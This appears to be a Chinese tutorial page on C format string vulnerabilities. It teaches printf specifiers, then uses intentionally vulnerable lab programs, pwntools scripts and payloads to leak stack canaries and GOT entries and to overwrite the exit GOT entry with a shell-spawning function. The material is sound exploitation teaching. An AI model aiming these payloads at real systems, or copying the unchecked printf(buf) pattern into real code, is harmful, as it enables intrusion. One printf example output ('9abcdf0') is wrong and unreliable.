---
title: "格式化字符串漏洞"
description: ""
lead: ""
date: 2023-04-11T22:02:30+08:00
lastmod: 2023-04-11T22:02:30+08:00
draft: false
images: []
menu:
  docs:
    parent: ""
    identifier: "格式化字符串漏洞-49c2d2d2dfd332c425e6afa6d55308cd"
weight: 0
toc: true
---

## 0x01 介绍

在学习C语言的时候，一般第一个学习的函数就是printf函数。它最常用的用法是通过格式化字符串来格式化输出内容，例如

```cpp
printf("%s", buf);
```

但是也可以简单的写为

```cpp
printf(buf);
```

这样也可以将buf字符串内容打印出来。但是这样做有个很大的风险，printf默认它的第一个参数中如果有格式化控制符则会进行解析，如果你对buf字符串输入了格式化控制符的话，这里就会出错，这个就是格式化字符串漏洞。

当我们往buf里输入格式化控制符的话，它会去找对应的参数进行解析，这里所谓的参数就是给printf的第一个之后的参数。但是我们简写的例子并没有给它第二个参数，它就会按照调用约定，自动认为后一个值为它的参数，然后我们可以利用格式化控制符对其进行操作。

![d35711cb164057aeddca479db85a5fa6](images/d35711cb164057aeddca479db85a5fa6.png)  

在此之前我们需要详细的学习一下格式化控制符以及修饰符。

常用的格式化控制符有如下几个：

- %d：有符号十进制

- %u：无符号十进制
- %x：十六进制整数
- %s: 字符串
- %p：指针格式
- %n：将前面打印的字节数写入到给定指针指向的地方

```cpp
#include<stdio.h>
int main() {
    int a = 10;
    printf("%d\n", a);
    printf("%x\n", a);
    printf("%p\n", &a);    // 打印的是a的地址
    printf("aaaa%n\n", &a);    // 写入变量a中
    printf("%d\n", a);
    return 0;
}

```

![1676e3e5538e48ea3ef64355fa038ef0](images/1676e3e5538e48ea3ef64355fa038ef0.png)  

而修饰符有以下几个常用的：

1. 宽度控制符，控制输出的宽度，形式为 `%nd` ，即输出n位宽度的字符串，如果不足则补空格右对齐  

    ```cpp
    printf("%4d", 10);
    // 输出 "  10"
    ```

2. 标志修饰符，控制输出的格式，常用的有以下几个  
    #：对于不同进制输出标志性字符  

    ```cpp
    printf("%#x", 10);
    // 输出 "0xa"
    ```

    0：用0填充输出的宽度不足的部分，只对数字类型有效  

    ```cpp
    printf("%04d", 1);
    // 输出 "0001"
    ```

    \-：左对齐输出  

    ```cpp
    printf("%-2d", 1);
    // 输出 "1 "
    ```

    +：输出数值类型时始终显示正负号  

    ```cpp
    printf("%+d", 2);
    // 输出 "+2"
    ```

3. 精度修饰符，用来控制浮点数输出的小数位数或者字符串输出的字符个数，例如 `%.ns` ，输出字符串时保留n个字节  

    ```cpp
    printf("%.3s", "hello");
    // 输出 "hel"
    ```

4. 长度修饰符，控制输出数据的大小，常用的有  
    hh：一个字节大小  

    ```cpp
    printf("%hhx", 0x123456789abcdef0);
    // 输出 "f0"
    ```

    h：两个字节  

    ```cpp
    printf("%hx", 0x123456789abcdef0);
    // 输出 "def0"
    
    ```

    l：4个字节  

    ```cpp
    printf("%lx", 0x123456789abcdef0);
    // 输出 "9abcdf0"
    
    ```

    ll：8个字节  

    ```cpp
    printf("%llx", 0x123456789abcdef0);
    // 输出 "123456789abcdef0"
    ```

5. 参数控制符，可以控制访问第几个参数，形式为 `%n$d` ，可以访问printf第n+1个参数  

    ```cpp
    printf("%2$d", 1, 2, 3);
    // 输出 "2"
    ```

      

学过了这些基本知识再来看看格式化字符串漏洞的两种表现形式：任意读和任意写。任意读比较好理解，我们一开始的那个例子就是任意读的应用，可以读取栈中的内容，如果我们加上参数控制符，那么就可以任意读取栈中你想要的数据

![f658e3b1b8b385cef45abcf09a29244a](images/f658e3b1b8b385cef45abcf09a29244a.png)  

而栈里面有很多有用数据，比如canary值、栈地址和libc地址，然后我们通过任意读就可以来绕过canary、计算libc基地址等操作。一般用%p来泄露栈中数据比较多，因为它可以将数据以指针的形式打印出来。但是它只能打印栈中的内容，如果要打印指定地方的值，比如bss、got表等地方，你可以用%s来打印，%s会接收一个指针作为参数，然后打印指针指向地方的数据。

我们先尝试泄露栈内容试试，举个例子

```cpp
#include<stdio.h>
#include<stdlib.h>

int main() {
    setbuf(stdout, 0);    // printf是缓存型输出，如果你不设置stdout的缓冲区为0的话，则可能不能及时获取输出
    char buf[0x10];
    printf("input: \n");
    scanf("%16s", buf);
    printf(buf);
    return 0;
}
// gcc format_leak_x32.c -m32 -o format_leak_x32
```

这是一个32位的程序，然后加了canary保护，我们可以通过这里的格式化字符串漏洞来尝试泄露canary值，我们把断点设置在格式化字符串漏洞处，来看一下栈的布局

![b2df5d2144ef11679bddba82d1e5e8d1](images/b2df5d2144ef11679bddba82d1e5e8d1.png)  

从图中不难看出，canary的位置相当于格式化字符串的第十一个参数，所以我们可以通过 `%11$p` 将canary值泄露出来

![16a9daaef6d1c3a0010b439009020fb1](images/16a9daaef6d1c3a0010b439009020fb1.png)  

这个泄露出来的值可以看出来很明显的canary特征。我们再将其编译为64位程序来看一下

```cpp
$ gcc format_leak_x32.c -o format_leak_x64
```

![38b46bc2541a2460fcd50089e840b52f](images/38b46bc2541a2460fcd50089e840b52f.png)  

64位和32位不同的地方在于64位函数的前6个参数都是通过寄存器来传递的，超过的才会用到栈

![0d84229e17b1689ec1777abb883dbcca](images/0d84229e17b1689ec1777abb883dbcca.png)  

所以这里canary对于格式化字符串参数的偏移量为5个参数寄存器+4个栈单元=9，输入 `%9$p` 即可泄露canary值

![88e7cb225ec2cb07e2b10c5b6679152f](images/88e7cb225ec2cb07e2b10c5b6679152f.png)  

再来看看如何泄露其他地方的值，比如泄露got表内容，还是以上面那个32位例子来看，我们这里需要用到got表的地址再加上 `%s` 即可泄露。首先我们需要通过调试来确定buf距离格式化字符串的偏移量，因为我们的got表地址是存储在buf中的，我们需要通过参数控制符来让 `%s` 读取该地址的内容。从之前的分析可以看到偏移量为7，所以payload可以这样写

```cpp
payload = p32(printf_got) + b"%7$s"
```

![4b74ecf6c60f48346c9239a3bbb7c597](images/4b74ecf6c60f48346c9239a3bbb7c597.png)  

任意写则是通过 `%n` 来实现，该格式控制符也需要一个指针来作为参数，通常该格式化控制符一次性写入的是4个字节，但是我们可以通过长度控制符来控制一次性写入的字节，举个例子

```cpp
#include<stdio.h>
#include<stdlib.h>
int a = 0x12345678;
int main() {
    char buf[0x10];
    scanf("%16s", buf);
    printf(buf);
    printf("\na: %x\n", a);
    if(a == 0x12345604) {
        system("/bin/sh");
    } else {
        printf("err\n");
    }
    return 0;
}
// gcc format_attack_x32.c -o format_attack_x32 -no-pie -m32
```

如果不加长度控制符的话，则会覆盖掉a所有的值

```cpp
from pwn import *
# context.log_level = 'debug'
o = process("./format_attack_x32")
elf = ELF("./format_attack_x32")
a = 0x804a02c
payload = p32(a) + b"%7$n"
o.sendline(payload)
o.interactive()
```

![0a680426ce61f38655621c78a0d1affb](images/0a680426ce61f38655621c78a0d1affb.png)

但是如果我们加上长度控制符，只覆盖一个字节的话，则会不同

```cpp
from pwn import *
# context.log_level = 'debug'
o = process("./format_attack_x32")
elf = ELF("./format_attack_x32")
a = 0x804a02c
payload = p32(a) + b"%7$hhn"
o.sendline(payload)
o.interactive()
```

![2dd2640fce4a75720903478c0c834d9d](images/2dd2640fce4a75720903478c0c834d9d.png)  

接下来我们尝试通过格式化字符串漏洞任意写got表内容为getshell函数地址，以一个例子来讲

```cpp
#include<stdio.h>
#include<stdlib.h>
void hint() {
    system("/bin/sh");
}
int main() {
    setbuf(stdout, 0);
    char buf[0x20];
    scanf("%s", buf);
    printf(buf);
    exit(0);
}
// gcc format_attack.c -o format_attack -m32 -no-pie
```

32位程序的地址一般都是满4个字节的，但是通过格式化字符串漏洞任意写的话首先要打印很长的字节才行，这样既低效又有可能执行失败。这里就得采用宽度控制符+分段覆盖的方法来完成。我们可以采取每两个字节一覆盖的形式来完成，首先我们来看一下hint函数的地址

![c24fee3a29c2edbd7af3e1f48054f123](images/c24fee3a29c2edbd7af3e1f48054f123.png)  

0x0804851b，这个数字的后两个字节大小比前两个字节的大小要大，所以我们可先考虑写入exit的got表高两位，再写入它的低两位。首先我们先想想如何写入前两个字节，在payload我们由于要分两段写入的，所以会在最前面放两个地址即exit的got表+2地址和exit的got表地址，这里就有了8个字节，然后还需要再打印0x804-8个字节打印出的字节才可以达到前两个字节的大小，这时候再通过 `%hn` 写入两个字节到got表+2的位置。接着来想办法写入后两个字节，前面已经打印了0x804个字节的内容了，然后还需要打印0x851b-0x804个字节才能满足后两个字节的大小，这时候再通过 `%hn` 写入两个字节到got表的位置。所以payload可以写为

```cpp
payload = p32(exit_got+2) + p32(exit_got)
payload += "%{}d%7$hn".format(0x804-8)
payload += "%{}d%8$hn".format(0x851b-0x804)

```

![695b0ce22176f7e3e4de767a58f9c2d8](images/695b0ce22176f7e3e4de767a58f9c2d8.png)  

前面一大段的空白是宽度控制符打印出来的空格，这时候exit的got表就已经填为了hint函数的地址了。而我们学过call函数的时候会首先跳转到plt表执行，然后plt里第一条指令是跳转去执行对应got表里存储的地址，这里我们已经覆盖为hint后，调用exit函数就会直接跳转去执行hint函数了
